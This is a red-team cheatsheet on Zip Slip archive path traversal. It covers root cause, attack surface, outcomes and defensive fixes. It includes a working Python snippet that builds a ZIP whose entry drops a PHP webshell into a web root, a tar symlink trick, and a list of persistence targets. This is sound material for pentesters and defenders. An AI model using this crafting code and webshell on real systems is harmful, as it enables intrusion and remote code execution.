---
tags: [tools, path-traversal, zip-slip, pentesting, red-team]
difficulty: intermediate
module: "46 - Operator Technique Cheatsheets"
topic: "46.07 Archive Extraction Path Traversal (Zip Slip)"
---

# Archive Extraction Path Traversal (Zip Slip)

## Introduction
**Zip Slip** (archive-extraction path traversal) is a vulnerability in how applications **unpack archives** (ZIP, TAR, JAR, WAR, RAR, 7z, etc.). Archive formats store each entry's filename as arbitrary text — and that text can contain path-traversal sequences (`../`) or absolute paths (`/etc/...`). If the extracting code joins the entry name to a destination directory **without sanitizing it**, a malicious archive can write files **outside** the intended extraction folder — overwriting configuration, web roots, startup scripts, SSH keys, or binaries, leading to arbitrary file write and frequently remote code execution. It affected countless libraries across Java, JS, Python, Go, Ruby, and .NET.

## Root Cause
```text
+---------------------------------------------------------------+
|                     ZIP SLIP MECHANICS                       |
+---------------------------------------------------------------+
|  Archive entry name:  "../../../../var/www/html/shell.php"    |
|        |  app does:  dest = base_dir + "/" + entry.name        |
|        |  -> dest = "/extract/../../../../var/www/html/shell.php"
|        v  resolves to /var/www/html/shell.php  (OUTSIDE base) |
|  Vulnerable extractors DON'T canonicalize+check that the      |
|  final path stays within base_dir.                            |
+---------------------------------------------------------------+
```
Variants: `../` traversal, **absolute paths** (`/etc/cron.d/x`), **symlink entries** (TAR can store symlinks; extract a symlink then a file "through" it), and on Windows backslash traversal (`..\..\`).

## Crafting a Malicious Archive
Standard tools normalize paths, so you must build the archive manually to keep `../` in the entry name:
```python
import zipfile
z = zipfile.ZipFile("evil.zip", "w")
# entry name carries the traversal; arcname is stored verbatim
z.writestr("../../../../var/www/html/shell.php", "<?php system($_GET['c']); ?>")
z.close()
```
```bash
# TAR with traversal / symlink (GNU tar may warn but many libs don't check)
ln -s /var/www/html link; tar -cvf evil.tar link        # symlink trick
# or build entries with ../ via a script / older tar that allows it
```
Useful write targets: web roots (drop a webshell → RCE), `~/.ssh/authorized_keys`, cron dirs (`/etc/cron.d/`), systemd units, app config, autostart locations.

## Where to Look (attack surface)
Any feature that **accepts an uploaded archive and extracts it server-side**:
- "Import" / "restore backup" / "upload theme/plugin" features.
- CI/CD pipelines unpacking artifacts.
- Document/asset processors that unzip `.docx`/`.xlsx`/containers.
- Mobile/desktop apps unpacking update bundles.
- Any service auto-extracting uploaded `.zip`/`.tar.gz`.

```bash
# black-box test: upload an archive with a benign ../canary file, see if it lands outside
```

## Exploitation Outcomes
- **Webshell drop → RCE** (most common: write `shell.php`/`.jsp` into the web root).
- **Overwrite config/credentials** to weaken auth or inject attacker settings.
- **Plant SSH key / cron / service** for persistence and privesc (overlaps [[26 - Systemd Service File Abuse]], [[09 - Cron Job Abuse Writable Scripts]]).
- **DoS** by overwriting critical files.

## Why It Matters
Archive upload/extraction is a deceptively common feature, and Zip Slip turns a "harmless file upload" into arbitrary file write — frequently full RCE — bypassing many upload filters that only check the archive itself, not its contents. It's a high-impact, easily-missed bug class on import/restore/plugin features.

## Defensive Notes
- **Canonicalize then validate**: resolve the final extraction path (`realpath`) and verify it is *within* the intended base directory before writing each entry; reject entries with `..`, absolute paths, or unexpected symlinks.
- Use vetted, patched archive libraries (most fixed Zip Slip years ago — keep current); don't roll your own extractor.
- Extract to an isolated, non-executable, low-privilege directory; never directly into a web root.
- Validate entry names, set safe permissions, and cap entry count/size (also mitigates zip bombs).

## Related Notes
- [[26 - Systemd Service File Abuse]]
- [[09 - Cron Job Abuse Writable Scripts]]
- [[05 - Finding and Vetting Exploits]]
- [[01 - Reverse and Bind Shell Cheatsheet]]
